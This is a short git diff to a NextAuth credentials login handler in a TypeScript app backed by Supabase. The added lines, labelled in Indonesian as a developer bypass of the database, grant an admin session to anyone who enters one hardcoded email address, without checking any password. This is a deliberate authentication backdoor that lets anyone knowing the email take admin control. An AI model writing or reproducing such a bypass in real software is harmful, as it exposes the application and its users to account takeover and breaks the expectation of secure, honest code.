@@ -28,6 +28,15 @@ export const authOptions: NextAuthOptions = {
       async authorize(credentials) {
         if (!credentials?.username || !credentials?.password) return null;
 
+        // JALUR KHUSUS DEVELOPER (Bypass Database)
+        if (credentials.username === "danishalzam8002@gmail.com") {
+          return { 
+            id: "super-admin-dev", 
+            name: "Danish Alzam (Dev)", 
+            role: "admin" 
+          };
+        }
+
         const { data: user, error } = await supabase
           .from("users")
           .select("*")
